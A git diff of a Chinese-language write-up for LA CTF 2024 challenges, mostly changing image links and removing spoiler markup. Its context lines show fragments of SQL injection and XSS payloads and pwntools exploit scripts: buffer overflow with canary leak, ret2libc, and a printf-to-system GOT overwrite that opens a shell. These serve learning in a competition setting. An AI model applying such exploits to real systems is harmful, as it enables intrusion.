@@ -2,13 +2,13 @@
 
 ## Web
 ### terms and conditions
-![image](https://hackmd.io/_uploads/H1agE1W2p.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/594860a8-76e8-439e-a72e-79dbd354f200)
 按鈕會移動 趁他不注意按下去就有 flag
 
 `lactf{that_button_was_definitely_not_one_of_the_terms}`
 
 ### flaglang
-::: spoiler app.js(/view)
+app.js(/view)
 ```python
 app.get('/view', (req, res) => {
   if (!req.query.country) {
@@ -28,7 +28,7 @@ app.get('/view', (req, res) => {
   res.status(200).json({ msg: country.msg, iso: country.iso });
 });
 ```
-:::
+
 應該是作者沒寫好，只要不在 deny 的就行，不輸入 => None
 直接輸入網址就有 flag
 https://flaglang.chall.lac.tf/view?country=Flagistan
@@ -38,7 +38,7 @@ https://flaglang.chall.lac.tf/view?country=Flagistan
 
 ### la housing portal
 
-:::spoiler `app.py`
+`app.py`
 ```python
 @app.route("/submit", methods=["POST"])
 def search_roommates():
@@ -79,7 +79,6 @@ def get_matching_roommates(prefs: dict[str, str]):
     cursor.close()
     return r
 ```
-:::
 
 這題有明顯的 sqli，但是要繞 waf，長度不能超過 50 且不能含有 `--` 或 `/*` 這種註解字串
 
@@ -135,7 +134,7 @@ https://new-housing-portal.chall.lac.tf/finder/?q=%3Ciframe%20srcdoc%3D%27%3Cscr
 `lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}`
 
 ### penguin login
-:::spoiler app.py
+app.py
 ```python
 ...
 flag = Path("/app/flag.txt").read_text().strip()
@@ -207,7 +206,6 @@ def index():
 if __name__ == "__main__":
     app.run(debug=True)
 ```
-:::
 
 重點 :
 ```python
@@ -220,7 +218,6 @@ Postgres SQL Injection
 `_` 可以當作 wildcard [Reference](https://www.postgresql.org/docs/current/functions-matching.html)
 但是題目限制不能用 `LIKE` 所以要改用 `SIMILAR TO`
 
-:::spoiler
 ```python
 #!/usr/bin/python3.10
 
@@ -245,29 +242,26 @@ def bf():
 
 bf()
 ```
-:::
 
-:::danger
 被雷到的點 `{` 後面接 數字會被當 regex 所以一開始第一個字根本跑不出來
-:::
 
 `lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}`
 
 ## Crypto
 ### valentines-day
-![image](https://hackmd.io/_uploads/rkZooyW36.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/8f0834ec-793e-425e-88f6-d461b8e01a0e)
 
 從非字母的地方可以推測他是 substitution 或是 vigenere
 但是有說 key 長度 161
 
-![image](https://hackmd.io/_uploads/B1fRo1Zn6.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/a5bd1746-c3bc-41b0-9b01-bafac057e0d2)
 
 Auto solve 之後會看到開頭大概就可以猜到後面的 key
 
 ### very hot
 不會解一元三次式 Q_Q
 
-![image](https://hackmd.io/_uploads/rkEp3yWnp.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/1f8d85ef-2e05-4eff-bad9-8b3db4a1a1b0)
 
 ### selamat pagi
 純通靈 selamat pagi 是印尼語
@@ -276,7 +270,7 @@ Auto solve 之後會看到開頭大概就可以猜到後面的 key
 
 ### hOlyT
 
-:::spoiler `server.py`
+`server.py`
 ```python
 def crt(a, b, m, n):
     m1, n1 = xgcd(m, n)
@@ -310,7 +304,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-:::
 
 server 中的 `legendre` 和 `tonelli` 是求二次剩餘的函式，而 `xgcd` 是 extend gcd
 
@@ -324,7 +317,7 @@ server 中的 `legendre` 和 `tonelli` 是求二次剩餘的函式，而 `xgcd` 
 
 因此一開始我先用 1024 作為輸入取得 4 種狀態並儲存成 x1 ~ x4 這 4 個變數，再執行以下的腳本即可解密 flag
 
-:::spoiler `solve.py`
+`solve.py`
 ```python
 ct = ...
 N = ...
@@ -349,7 +342,6 @@ d = pow(e, -1, phi)
 m = pow(ct, d, N)
 print(long_to_bytes(m))
 ```
-:::
 
 `lactf{1s_r4bin_g0d?}`
 
@@ -369,7 +361,7 @@ No, that definitely isn't it.
 `lactf{not_what_forgive_and_forget_mean}`
 
 ### aplet321
-![image](https://hackmd.io/_uploads/r1Eu90Z3a.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/c4317b3f-6a9a-4a3a-b665-f10b518266f1)
 
 總結重點
 - r12 計算 `pretty` 次數
@@ -379,16 +371,16 @@ No, that definitely isn't it.
 - `r12 = 15, rbp = 39`
 - `flag` 要出現在 input
 
-![image](https://hackmd.io/_uploads/HyUXfyMhp.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/2d0907c5-33cc-4d56-84a0-6aac0580238f)
 
 ### flag-finder
 此遊戲使用GameMaker製作，可用[UndertaleModTool](https://github.com/krzys-h/UndertaleModTool)對`data.win`進行解殼與反編譯，修改將鑰匙物件移至人物可移動之範圍即可。
-![image](https://hackmd.io/_uploads/SyLtUIg3a.png)
-![image](https://hackmd.io/_uploads/rJw3L8enp.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/692c1a08-0cfa-485a-b581-83e345a6f181)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/115ca1ee-9e3b-4cd5-8958-7b8f8c954cdb)
 `lactf{k3y_to_my_h34rt}`
 
 ### glottem
-:::spoiler glottem
+glottem
 ```bash
 #!/bin/sh
 1<<4201337
@@ -409,7 +401,6 @@ for i in range(6,len(s)-2):
 exit(+(d!=260,[d!=61343])[0])
 4201337
 ```
-:::
 
 典型的 Polyglot 先拆成兩個檔案
 ```js
@@ -442,7 +433,7 @@ func = (lambda x, y: ([f"{x+alpha[b]}" for b in range(27) if e[y][alpha.index(x)
 
 接下來就是想辦法串接所有可能性後用兩邊 function 檢查結果
 遞迴好難寫 (
-:::spoiler Solve script
+Solve script
 ```python
 #!/usr/bin/python3.10
 from e import e
@@ -482,13 +473,12 @@ for i in out:
         print(flag)
         break
 ```
-:::
 
 
 ## Pwn
 ### aplet123
 
-:::spoiler `aplet123.c`
+`aplet123.c`
 ```clike
 #include <stdio.h>
 #include <stdlib.h>
@@ -528,7 +518,6 @@ int main(void) {
   }
 }
 ```
-:::
 
 ```
 [*] '/home/ywc/myworkspace/lactf2024/aplet123/aplet123'
@@ -545,7 +534,7 @@ gets 的地方有 bof 漏洞，可以先用 `strstr(input, "i'm")` 那邊偽造�
 
 後面就是一般的 bof jump `print_flag`
 
-:::spoiler `solve.py`
+`solve.py`
 ```python
 from pwn import *
 binary = "./aplet123"
@@ -571,13 +560,11 @@ conn.sendline(b"bye")
 
 conn.interactive()
 ```
-:::
 
 `lactf{so_untrue_ei2p1wfwh9np2gg6}`
 
 ### 52-card-monty
-
-:::spoiler `monty.c`
+`monty.c`
 ```clike
 #include <stdio.h>
 #include <stdlib.h>
@@ -666,7 +653,6 @@ int main() {
   return 0;
 }
 ```
-:::
 
 ```
 [*] '/home/ywc/myworkspace/lactf2024/52_card_monty/monty'
@@ -695,7 +681,7 @@ fgets(name, 52, stdin);
 
 我們可以先用兩次的 leak 得到 canary 和 code base 之後，在猜 queen 那邊隨便猜不影響，而最後輸入名字那邊就能正常 bof 跳 `win` 拿 flag
 
-:::spoiler `solve.py`
+`solve.py`
 ```python
 from pwn import *
 binary = "./monty"
@@ -727,13 +713,12 @@ conn.sendlineafter(b"Name: ", b"A"*0x18 + p64(canary) + b"B"*8 + p64(win))
 
 conn.interactive()
 ```
-:::
 
 `lactf{m0n7y_533_m0n7y_d0}`
 
 ### sus
 
-:::spoiler `sus.c`
+`sus.c`
 ```clike
 #include <stdio.h>
 
@@ -748,7 +733,6 @@ int main(void) {
   sus(u);
 }
 ```
-:::
 
 ```
 [*] '/home/ywc/myworkspace/lactf2024/sus/sus'
@@ -767,7 +751,7 @@ int main(void) {
 
 後面就是一般的 ret2libc，不過搞 libc 的問題搞很久，總之現在知道 `redpwn/jail` 的 libc 通常會在 `/srv` 起始的路徑下
 
-:::spoiler `solve.py`
+`solve.py`
 ```python
 from pwn import *
 binary = "./sus_old"
@@ -816,13 +800,12 @@ conn.sendline(b"A"*0x40 + p64(0xdeadbeef) + chain)
 
 conn.interactive()
 ```
-:::
 
 `lactf{amongsus_aek7d2hqhgj29v21}`
 
 ### pizza
 
-:::spoiler `pizza.c`
+`pizza.c`
 ```clike
 #include <stdio.h>
 #include <string.h>
@@ -872,7 +855,6 @@ int main(void) {
   }
 }
 ```
-:::
 
 ```
 [*] '/home/ywc/myworkspace/lactf2024/pizza/pizza'
@@ -894,7 +876,7 @@ printf("\n");
 
 我們可以先 leak 出 libc 及 code base，得出 system 以及 printf 的 got 位置，我們就能夠修改 printf 的 got 成 system，即可在呼叫 printf 時變成呼叫 system，再帶入 `/bin/sh` 字串即可開 shell
 
-:::spoiler `solve.py`
+`solve.py`
 ```python
 from pwn import *
 binary = "./pizza"
@@ -941,13 +923,12 @@ conn.sendlineafter(b"topping: ", b"/bin/sh\x00")
 
 conn.interactive()
 ```
-:::
 
 `lactf{golf_balls_taste_great_2tscx63xm3ndvycw}`
 
 ## Misc
 ### infinite loop
-![image](https://hackmd.io/_uploads/ry8t_yWna.png)
+![upload_456881111a36cff130f2d7130474993d](https://github.com/i-m-down-QQ/writeups/assets/67849251/98513054-6dd7-43dd-9a02-a72b4c9adc1b)
 
 直接從前端搜尋
 `lactf{l34k1ng_4h3_f04mz_s3cr3tz}`
@@ -969,21 +950,20 @@ conn.interactive()
 
 找`Shorebirds nesting on rocks STATE PARK california`
 
-![image](https://hackmd.io/_uploads/r1Cv8Qk36.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/445268ca-95b9-45f6-9eb8-cc6a85243213)
 
 [翻了一下美國護鳥協會，海岸邊主要保護 Shorebrid 都在這](https://www.montereyaudubon.org/shorebirds)
 
 近岸邊的都放大看一遍
 
-![image](https://hackmd.io/_uploads/S1O1Dmk2a.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/3a6e766d-722b-400b-bc1c-43b76e26c64e)
 
 `(36.515520, -121.949320)`
-![image](https://hackmd.io/_uploads/rJagw713a.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/2fb10c26-f842-4c5e-ac12-230a340edcff)
 
 `lactf{36.516,-121.949}`
 
-### gacha
-:::spoiler package.sh
+### gachapackage.sh
 ```bash
 #!/bin/sh
 dd if=/dev/urandom ibs=1 count=128 > secret.key
@@ -1004,13 +984,12 @@ rm flag.png
 rm -f chall.zip
 zip -9r chall.zip chall/
 ```
-:::
 
 看都沒看 code 直接猜 Image XOR
 最後用 stegsolve 的 image combiner xor `uwu` `owo` 就好
 
-![image](https://hackmd.io/_uploads/rkJ6agWha.png)
-![image](https://hackmd.io/_uploads/B1v9px-2p.png)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/0ff481a5-7ad0-4af3-985a-d52c61d7a714)
+![image](https://github.com/i-m-down-QQ/writeups/assets/67849251/22b5f131-d01d-4267-becd-1470f929aacd)
 
 ## Welcome
 ### discord
